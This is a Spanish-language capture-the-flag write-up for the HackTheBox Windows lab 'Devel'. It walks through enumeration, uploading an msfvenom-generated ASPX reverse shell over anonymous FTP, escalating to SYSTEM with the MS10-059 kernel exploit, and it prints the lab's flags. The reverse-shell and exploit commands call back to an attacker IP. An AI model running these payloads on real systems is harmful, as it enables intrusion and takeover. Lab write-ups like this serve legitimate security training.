# Devel (Easy Windows)

**Author:** Ph4n3s
**Fecha:** 23/10/2026
**IP:** 10.129.79.200
**Dificultad:** Easy / Windows

---

## 1. Enumeración

### 1.1 Ping

```
ping -c 1 10.129.79.200
```

```
64 bytes from 10.129.79.200: icmp_seq=1 ttl=127 time=4212 ms
```

Con TTL cercano a 128 asumimos un sistema Windows (el tiempo de respuesta tan alto es puntual, probablemente por la carga del spawn de la máquina).

### 1.2 Enumeración de puertos abiertos

```
nmap -p- --open -T4 --min-rate 5000 10.129.79.200
```

```
21/tcp open  ftp
80/tcp open  http
```

### 1.3 Enumeración de tecnologías

```
nmap -p 80,21 -sVC -T4 --min-rate 5000 -Pn 10.129.79.200
```

```
21/tcp open  ftp     Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods:
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Dos datos clave: el FTP permite **login anónimo**, y ese FTP comparte la misma raíz que el sitio web IIS (`aspnet_client`, `iisstart.htm`, `welcome.png` son justo los archivos por defecto de un sitio IIS recién instalado). Eso significa que cualquier archivo que subamos por FTP debería quedar accesible también por HTTP.

### 1.4 Script vuln de nmap

```
nmap -p 80,21 --script vuln -T4 --min-rate 5000 10.129.79.200
```

```
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-vuln-cve2015-1635:
|   VULNERABLE:
|   Remote Code Execution in HTTP.sys (MS15-034)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-1635
```

Nmap marca la máquina como vulnerable a MS15-034, pero suele ser un falso positivo de esta versión de IIS/HTTP.sys (solo permite leer memoria del kernel vía `Range`, no ejecutar código por sí solo). No lo perseguimos: con el acceso anónimo de FTP ya tenemos un vector mucho más directo.

---

## 2. Explotación

Como el FTP anónimo escribe directamente sobre la raíz web de IIS, el plan es subir una **web shell en ASPX** por FTP y ejecutarla visitándola por HTTP.

**Paso 1 — Generar el payload** con `msfvenom`:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.120 LPORT=4444 -f aspx -o shell.aspx
```

**Paso 2 — Subirlo por FTP anónimo:**

```
ftp 10.129.79.200
> anonymous
> (contraseña en blanco)
ftp> put shell.aspx
```

**Paso 3 — Abrir listener y disparar la shell:**

```bash
nc -lvnp 4444
curl http://10.129.79.200/shell.aspx
```

IIS ejecuta el `.aspx` como código ASP.NET bajo el pool de aplicación, y recibimos una shell inversa — pero con privilegios muy limitados (cuenta de servicio de IIS, sin permisos sobre el sistema).

---

## 3. Escalada de privilegios

El sistema es una versión antigua de Windows sin parchear, así que buscamos un exploit de escalada de privilegios a nivel de kernel. Con la información de `systeminfo` (versión de build, hotfixes instalados) se puede usar **Windows Exploit Suggester** para acotar candidatos, o directamente `searchsploit` sobre el sistema operativo.

El exploit elegido fue **CVE-2010-2554 / MS10-059** ("Chimichurri"), que compilado da un binario (`MS10-059.exe`) capaz de spawnear una shell con privilegios de `NT AUTHORITY\SYSTEM`.

**Paso 1 — Subir el exploit** por el mismo FTP anónimo, a la raíz web (`C:\inetpub\wwwroot`):

```
ftp> put MS10-059.exe
```

**Paso 2 — Confirmar que está en el servidor** desde la shell ya obtenida:

```
dir C:\inetpub\wwwroot
```

**Paso 3 — Abrir un segundo listener** (puerto 4445) y ejecutar el exploit pasándole nuestra IP y puerto como parámetros:

```
C:\inetpub\wwwroot\MS10-059.exe 10.10.16.120 4445
```

El binario abre una nueva conexión hacia nosotros, esta vez con una shell como `NT AUTHORITY\SYSTEM`.

---

## 4. Post-explotación

Con la shell de sistema, leemos ambas flags:

```
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\babis\Desktop\user.txt
```

```
ROOT FLAG -> e84dbb08663ab19315472bfb585a6ede
USER FLAG -> bcd649fa3811b0c77561b89f131b64e4
```

![Máquina Devel resuelta en HackTheBox](capturas/devel-pwned.png)

---

## Resumen rápido

**Qué era la máquina:** un IIS 7.5 recién instalado con FTP anónimo apuntando a la misma raíz web — configuración por defecto sin asegurar — sobre un Windows sin parches de kernel.

**Enumeración:** `nmap` → FTP (21) con login anónimo y HTTP (80) con IIS 7.5 → la estructura de archivos del FTP coincide con la raíz web, señal de que ambos comparten directorio.

**Explotación:** se genera una web shell `.aspx` con `msfvenom`, se sube por FTP anónimo y se ejecuta visitándola por HTTP → reverse shell con privilegios bajos (cuenta de servicio de IIS).

**Escalada de privilegios:** el sistema operativo, sin parchear, es vulnerable a un exploit de kernel conocido (MS10-059 / CVE-2010-2554, "Chimichurri") → se sube el binario por el mismo FTP, se ejecuta desde la shell ya obtenida → shell como `NT AUTHORITY\SYSTEM`.

**Concepto clave aprendido:** cuando un servicio de subida de archivos (FTP, en este caso) comparte directorio con un servicio web que ejecuta código (IIS + ASP.NET), subir cualquier archivo equivale a conseguir ejecución remota de código — no hace falta ninguna vulnerabilidad de software, solo una mala configuración de permisos entre servicios.

---

**Flags:**
- `user.txt` (babis) → `bcd649fa3811b0c77561b89f131b64e4`
- `root.txt` (Administrator) → `e84dbb08663ab19315472bfb585a6ede`
